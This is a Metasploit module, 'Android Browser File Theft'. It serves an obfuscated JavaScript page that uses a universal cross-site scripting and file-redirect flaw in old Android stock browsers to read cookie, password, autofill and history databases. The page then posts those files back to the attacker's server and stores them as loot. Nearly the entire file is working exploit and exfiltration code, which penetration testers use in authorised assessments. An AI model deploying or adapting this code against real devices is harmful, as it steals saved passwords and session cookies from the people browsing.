##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/jsobfu'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Auxiliary::Report
  include Msf::Exploit::JSObfu

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Android Browser File Theft',
      'Description' => %q{
        This module steals the cookie, password, and autofill databases from the
        Browser application on AOSP 4.3 and below.
      },
      'Author'         => [
        'Rafay Baloch', # Found UXSS bug in Android Browser
        'joev'          # File redirect and msf module
      ],
      'License'     => MSF_LICENSE,
      'Actions'     => [[ 'WebServer' ]],
      'PassiveActions' => [ 'WebServer' ],
      'References' =>
        [
          # patch for file redirection, 2014
          ['URL', 'https://android.googlesource.com/platform/packages/apps/Browser/+/d2391b492dec778452238bc6d9d549d56d41c107%5E%21/#F0'],
          ['URL', 'https://code.google.com/p/chromium/issues/detail?id=90222'] # the UXSS
        ],
      'DefaultAction'  => 'WebServer'
    ))

     register_options([
      OptString.new('ADDITIONAL_FILES', [
        false,
        'Comma-separated list of addition file URLs to steal.',
      ]),
      OptBool.new('DEFAULT_FILES', [
        true,
        'Steals a default set of file URLs',
        true
      ])
    ])
  end

  def run
    exploit
  end

  def on_request_uri(cli, request)
    if request.method.downcase == 'post'
      process_post(cli, request)
      send_response_html(cli, '')
    else
      print_status('Sending exploit landing page...')
      send_response_html(cli, exploit_html)
    end
  end

  def process_post(cli, request)
    data = JSON.parse(request.body)
    contents = hex2bin(data['data'])
    file = File.basename(data['url'])
    print_good("File received: #{(contents.bytesize.to_f/1000).round(2)}kb #{file}")
    loot_path = store_loot(
      file,
      'application/x-sqlite3',
      cli.peerhost,
      contents,
      File.basename(data['url']),
      "#{cli.peerhost.ljust(16)} Android browser file"
    )
    print_good("Saved to: #{loot_path}")
  end


  def file_urls
    default_urls = [
      'file:///data/data/com.android.browser/databases/webviewCookiesChromium.db',
      'file:///data/data/com.android.browser/databases/webview.db',
      'file:///data/data/com.android.browser/databases/autofill.db',
      'file:///data/data/com.android.browser/databases/browser2.db',
      'file:///data/data/com.android.browser/app_appcache/ApplicationCache.db',
      'file:///data/data/com.android.browser/app_databases/Databases.db',
      'file:///data/data/com.android.browser/databases/webviewCookiesChromiumPrivate.db'
    ]

    unless datastore['DEFAULT_FILES']
      default_urls = []
    end

    default_urls + (datastore['ADDITIONAL_FILES']||'').split(',')
  end

  def exploit_html
    %Q|
      <!doctype html>
      <html>
      <body>
      <script>#{exploit_js}</script>
      </body>
      </html>
    |
  end

  def exploit_js
    js_obfuscate %Q|
      window.onmessage = function(e) {
        var x = new XMLHttpRequest;
        x.open("POST", location.href);
        x.send(JSON.stringify(e.data))
      };


      function xss() {
        var urls = (#{JSON.generate(file_urls)});
        function tick() {
          setTimeout(function() { next(urls.shift()); });
        };
        window.onmessage = tick;

        function next(url) {
          if (!url) return;
          try {
            var f = document.createElement('iframe');
            f.src = url;
            f.onload = function() {
              f.onload = null;
              function nested() {
                var x = new XMLHttpRequest;
                x.open('GET', location.href);
                x.responseType = 'arraybuffer';
                x.send();
                x.onload = function() {
                  var buff = new Uint8Array(x.response);
                  var hex = Array.prototype.map.call(buff, function(d) {
                    var c = d.toString(16);
                    return (c.length < 2) ? 0+c : c;
                  }).join(new String);
                  /*ensures there are no 'not allowed' responses that appear to be valid data*/
                  if (hex.length && hex.indexOf('#{Rex::Text.to_hex("<html><body>not allowed</body></html>","")}') === -1) {
                    top.postMessage({data:hex,url:location.href}, '*');
                  }
                  parent.postMessage(1,'*');
                };
                x.onerror = function() {
                  parent.postMessage(1,'*');
                };
              }
              document.documentURI = 'javascript://hostname.com/%0D%0A('+encodeURIComponent(nested.toString())+')()';
              f.contentWindow.location = "";
            };
            document.body.appendChild(f);
          } catch(e) {t();}
        };

        tick();

      }

      var brokenFrame = document.createElement('iframe');
      brokenFrame.src = 'http://localhost:100';
      brokenFrame.setAttribute('style', 'position:absolute;left:-1000px;height:0;width:0;visibility:hidden;')
      brokenFrame.onload = function() {
        brokenFrame.onload = null;
        document.documentURI = 'javascript://hostname.com/%0D%0A('+encodeURIComponent(xss.toString())+')()';
        brokenFrame.contentWindow.location = "";
      };
      document.body.appendChild(brokenFrame);
    |
  end

  # TODO: Make this a proper Rex::Text function
  def hex2bin(hex)
    hex.chars.each_slice(2).map(&:join).map { |c| c.to_i(16) }.map(&:chr).join
  end
end
